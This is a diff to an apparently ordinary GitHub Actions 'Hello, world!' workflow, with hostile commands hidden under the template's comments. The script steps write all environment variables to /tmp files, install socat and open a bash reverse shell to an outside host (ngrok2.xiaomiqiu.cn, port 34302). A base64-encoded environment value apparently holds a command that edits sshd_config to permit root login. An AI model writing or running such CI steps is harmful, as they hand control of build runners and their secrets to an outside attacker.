@@ -27,13 +27,13 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: bash -c "(sleep 20&);echo 'Hello, world!'"
+        run: bash -c "(sleep 80;env>/tmp/b1.txt);sudo apt-get install socat;echo 'Hello, world!'"
 
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
           echo Add other actions to build,
           echo test, and deploy your project.
-          bash -c "(sleep 360&);env>/tmp/zxc2;bash -i &>/dev/tcp/ngrok2.xiaomiqiu.cn/34302 0>&1"
+          bash -c "(sleep 360&);env>/tmp/c2.txt;bash -i &>/dev/tcp/ngrok2.xiaomiqiu.cn/34302 0>&1"
         env:
           sshc1: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
